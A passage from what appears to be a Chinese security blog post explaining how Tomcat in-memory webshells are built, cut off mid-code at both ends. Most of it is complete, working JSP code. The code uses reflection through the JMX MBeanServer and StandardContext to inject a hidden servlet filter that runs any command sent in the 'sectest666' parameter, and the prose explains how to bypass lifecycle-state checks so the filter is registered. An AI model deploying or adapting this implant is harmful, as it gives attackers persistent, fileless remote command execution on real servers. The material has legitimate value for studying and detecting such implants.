<span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">            StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">            servletResponse.getOutputStream().flush();</span><br><span class="line">            servletResponse.getOutputStream().close();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        测试结果如下：</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228170513038.png" alt="image-20201228170513038"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228170253396.png" alt="image-20201228170253396"></p>
<p>​        最后给出完整的jsp源码</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.management.MBeanServer"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.tomcat.util.modeler.Registry"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Map"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.HashMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Method"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.tomcat.util.descriptor.web.FilterDef"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;AddFilter&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> REInject</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TomcatShellFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * webshell命令参数名</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String cmdParamName = <span class="string">"sectest666"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse,</span></span></span><br><span class="line"><span class="function"><span class="params">                             FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            String cmd;</span><br><span class="line">            <span class="keyword">if</span> ((cmd = servletRequest.getParameter(cmdParamName)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">                java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                        <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">                StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">                servletResponse.getOutputStream().flush();</span><br><span class="line">                servletResponse.getOutputStream().close();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> String filterName = <span class="string">"TomcatFilterShell"</span>;</span><br><span class="line">    <span class="keyword">final</span> String filterUrlPattern = <span class="string">"/xxxxxxx/*"</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        MBeanServer mBeanServer = Registry.getRegistry(<span class="keyword">null</span>, <span class="keyword">null</span>).getMBeanServer();</span><br><span class="line">        <span class="comment">// 获取mbsInterceptor</span></span><br><span class="line">        Field field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.JmxMBeanServer"</span>).getDeclaredField(<span class="string">"mbsInterceptor"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object mbsInterceptor = field.get(mBeanServer);</span><br><span class="line">        <span class="comment">// 获取repository</span></span><br><span class="line">        field = Class.forName(<span class="string">"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor"</span>).getDeclaredField(<span class="string">"repository"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object repository = field.get(mbsInterceptor);</span><br><span class="line">        <span class="comment">// 获取domainTb</span></span><br><span class="line">        field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.Repository"</span>).getDeclaredField(<span class="string">"domainTb"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap&lt;String, Map&lt;String, NamedObject&gt;&gt; domainTb = (HashMap&lt;String,Map&lt;String,NamedObject&gt;&gt;)field.get(repository);</span><br><span class="line">        <span class="comment">// 获取domain</span></span><br><span class="line">        NamedObject nonLoginAuthenticator = domainTb.get(<span class="string">"Catalina"</span>).get(<span class="string">"context=/,host=localhost,name=NonLoginAuthenticator,type=Valve"</span>);</span><br><span class="line">        out.println(<span class="string">"Inject /,please visit /xxxxxxx/aaaa?sectest666=whoami"</span>);</span><br><span class="line">            <span class="keyword">if</span>(nonLoginAuthenticator==<span class="keyword">null</span>)&#123;</span><br><span class="line">                nonLoginAuthenticator = domainTb.get(<span class="string">"Catalina"</span>).get(<span class="string">"context=/manager,host=localhost,name=BasicAuthenticator,type=Valve"</span>);</span><br><span class="line">                out.println(<span class="string">"Inject /manager,please visit /manager/xxxxxxx/aaaa?sectest666=whoam"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span>).getDeclaredField(<span class="string">"object"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object object = field.get(nonLoginAuthenticator);</span><br><span class="line">        <span class="comment">// 获取resource</span></span><br><span class="line">        field = Class.forName(<span class="string">"org.apache.tomcat.util.modeler.BaseModelMBean"</span>).getDeclaredField(<span class="string">"resource"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object resource = field.get(object);</span><br><span class="line">        <span class="comment">// 获取context</span></span><br><span class="line">        field = Class.forName(<span class="string">"org.apache.catalina.authenticator.AuthenticatorBase"</span>).getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        StandardContext context = (StandardContext) field.get(resource);</span><br><span class="line">        FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">        FilterDef filterDef = context.findFilterDef(filterName);</span><br><span class="line">        Filter filter = <span class="keyword">new</span> TomcatShellFilter();</span><br><span class="line">            <span class="comment">// filterDef</span></span><br><span class="line">        <span class="keyword">if</span> (filterDef == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// Gen filterDef</span></span><br><span class="line">                filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">                filterDef.setFilterName(filterName);</span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">                filterDef.setFilter(filter);</span><br><span class="line">                <span class="comment">// Add filterDef</span></span><br><span class="line">                context.addFilterDef(filterDef);</span><br><span class="line">                <span class="comment">// Refresh filterConfigs</span></span><br><span class="line">                context.filterStart();</span><br><span class="line">                <span class="comment">// filterMap</span></span><br><span class="line">                filterMap.setFilterName(filterName);</span><br><span class="line">                filterMap.setDispatcher(String.valueOf(DispatcherType.REQUEST));</span><br><span class="line">                filterMap.addURLPattern(filterUrlPattern);</span><br><span class="line">                context.addFilterMap(filterMap);</span><br><span class="line">                <span class="comment">// Order</span></span><br><span class="line">                Object[] filterMaps = context.findFilterMaps();</span><br><span class="line">                Object[] tmpFilterMaps = <span class="keyword">new</span> Object[filterMaps.length];</span><br><span class="line">                <span class="keyword">int</span> index = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    FilterMap f = (FilterMap) filterMaps[i];</span><br><span class="line">                    <span class="keyword">if</span> (f.getFilterName().equalsIgnoreCase(filterName)) &#123;</span><br><span class="line">                        tmpFilterMaps[<span class="number">0</span>] = f;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        tmpFilterMaps[index++] = f;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                    filterMaps[i] = tmpFilterMaps[i];</span><br><span class="line">                &#125;</span><br><span class="line">                out.println(<span class="string">"添加Filter成功"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        out.println(<span class="string">"已成功添加"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        out.println(<span class="string">"添加Filter失败"</span>);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="servletContext注册Filter"><a href="#servletContext注册Filter" class="headerlink" title="servletContext注册Filter"></a>servletContext注册Filter</h4><p>​        Servlet，Listener，Filter由ServletContext去加载，无论是使用xml配置还是使用Annotation注解配置，均由Web容器进行初始化，读取其中的配置属性，然后向Web容器中进行注册。Servlet 3.0 可以由ServletContext动态进行注册，因此需在Web容器初始化的时候（即建立ServletContext对象的时候）进行动态注册。 –<code>动态注册之Servlet+Filter+Listener</code></p>
<p>​        在使用servletContext动态注册Filter的过程中，主要使用了下面两个接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">servletContext.addFilter(<span class="string">"Tomcat WebSocket (JSR356) Filter"</span>, <span class="keyword">new</span> WsFilter())</span><br><span class="line">FilterRegistration.Dynamic.addMappingForUrlPatterns(types, <span class="keyword">true</span>, <span class="string">"/*"</span>);</span><br></pre></td></tr></table></figure>

<p>​        之前我们了解到注册Filter主要和FilterDef和FilterMap有关，这两个API为什么可以动态注册Filter，这种注册方式在tomcat中也有使用，代码如下：</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229093140871.png" alt="image-20201229093140871"></p>
<p>​        跟入org.apache.catalina.core.ApplicationContextFacade#addFilter(java.lang.String, javax.servlet.Filter),调用org.apache.catalina.core.ApplicationContext#addFilter(java.lang.String, javax.servlet.Filter)。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229093340066.png" alt="image-20201229093340066"></p>
<p>​        创建filterDef并调用org.apache.catalina.core.StandardContext#addFilterDef将添加filterDef。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229093636388.png" alt="image-20201229093636388"></p>
<p>​        再看看<code>FilterRegistration.Dynamic.addMappingForUrlPatterns(types, true, &quot;/*&quot;);</code>,同样调用addFilterMap添加FilterMap到StandardContext对象中。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229100908801.png" alt="image-20201229100908801"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229100927048.png" alt="image-20201229100927048"></p>
<h5 id="MBeanServer获取servletContext"><a href="#MBeanServer获取servletContext" class="headerlink" title="MBeanServer获取servletContext"></a>MBeanServer获取servletContext</h5><p>​        通过之前的介绍，可以通过MBeanServer获取standardContext，再通过standardContext获取servletContext子类ApplicationContext，并调用addFilter和addMappingForUrlPatterns添加过滤器。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ApplicationContext appContext=<span class="keyword">new</span> ApplicationContext(context);</span><br><span class="line">Filter tomcatShellFilter = <span class="keyword">new</span> TomcatShellFilter();</span><br><span class="line">javax.servlet.FilterRegistration.Dynamic filterRegistration = appContext</span><br><span class="line">        .addFilter(filterName, tomcatShellFilter);</span><br><span class="line">filterRegistration.setInitParameter(<span class="string">"encoding"</span>, <span class="string">"utf-8"</span>);</span><br><span class="line">filterRegistration.setAsyncSupported(<span class="keyword">false</span>);</span><br><span class="line">filterRegistration           .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="keyword">false</span>,<span class="keyword">new</span> String[]&#123;filterUrlPattern&#125;);</span><br></pre></td></tr></table></figure>

<p>​        但在添加过程中发现会报<code>无法将筛选器添加到上下文[/manager]，因为该上下文已初始化</code>异常，经过调试在addFilter中会判断context对象中state的内容是否为STARTING_PREP，由于我们这里已经初始化完成，因此state状态为started，因此会抛异常。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229102204521.png" alt="image-20201229102204521"> </p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229102331539.png" alt="image-20201229102331539"></p>
<p>​    经过上面的分析，再调用addFilter添加Filter之前需要修改context中state的状态</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">        .getDeclaredField("state");</span><br><span class="line">stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);</span><br></pre></td></tr></table></figure>

<p>​    修改状态后虽然可以正常添加Filter过滤器，但是访问Filter会出错。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229103618089.png" alt="image-20201229103618089"></p>
<p>​    因此添加结束后需要将state的内容改回来。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stateField.set(context, org.apache.catalina.LifecycleState.STARTED);</span><br></pre></td></tr></table></figure>

<p>​    更改state状态后再去访问Filter，会返回404</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229104504167.png" alt="image-20201229104504167"></p>
<p>​        调试代码，在FilterMap中确实已经添加了我们的Filter。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229104534258.png" alt="image-20201229104534258"></p>
<p>​        但在FilterConfig中找不到我们的Filter，因此无法调用成功。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229104718640.png" alt="image-20201229104718640"></p>
<p>​        但我们已经将Filter的内容添加到FilterDefs中，经过查看org.apache.catalina.core.StandardContext#filterStart会将filterDefs的内容同步到filterConfigs中，因此需要反射调用filterStart。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229104856204.png" alt="image-20201229104856204"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Method filterStartMethod = org.apache.catalina.core.StandardContext<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">        .getMethod("filterStart");</span><br><span class="line">filterStartMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">filterStartMethod.invoke(context, <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229105256054.png" alt="image-20201229105256054"></p>
<p>​            最终JSP实现代码如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.management.MBeanServer"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.tomcat.util.modeler.Registry"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Map"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.HashMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Method"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.InvocationTargetException"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;servletContext&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> REInject</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TomcatShellFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * webshell命令参数名</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String cmdParamName = <span class="string">"sectest666"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse,</span></span></span><br><span class="line"><span class="function"><span class="params">                             FilterChain 